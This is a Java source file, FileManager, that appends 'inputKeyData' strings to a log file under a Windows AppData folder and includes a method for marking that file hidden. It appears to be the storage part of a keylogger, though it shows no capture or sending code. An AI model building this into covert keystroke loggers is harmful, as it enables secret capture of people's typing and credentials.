package dev.source.logger;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;

public class FileManager implements AutoCloseable {
	private static FileManager fileManagerInstance = null;
	private static final boolean ATTRIBUTE_VALUE = true;
	private static final String FILE_LOCATION = "C:\\Users\\Default\\AppData\\log.txt";
	private static File file;
	private static BufferedWriter writer;

	private FileManager() {
		// Exists only to defeat instantiation.
	}

	public static FileManager getInstance() throws IOException {
		if (fileManagerInstance == null) {
			initialize();
			// hide(file);
			fileManagerInstance = new FileManager();
		}
		writer = new BufferedWriter(new FileWriter(file));
		return fileManagerInstance;
	}

	private static void initialize() throws IOException {
		file = new File(FILE_LOCATION);
		if (!file.exists()) {
			file.createNewFile();
		}
	}

	private static void hide(File file) throws IOException {
		Path path = file.toPath();
		Boolean hidden = (Boolean) Files.getAttribute(path, "dos:hidden", LinkOption.NOFOLLOW_LINKS);
		if (hidden != null && !hidden) {
			Files.setAttribute(path, "dos:hidden", ATTRIBUTE_VALUE, LinkOption.NOFOLLOW_LINKS);
		}
	}

	public void log(String inputKeyData) throws IOException {
		writer.append(inputKeyData);
		writer.flush();
	}

	public void emptyLocalFileContent() throws IOException {
		writer.write("");
		writer.flush();
	}

	public String getFileLocation() {
		return FILE_LOCATION;
	}

	@Override
	public void close() throws Exception {
		if (writer != null) {
			writer.close();
		}
	}

}
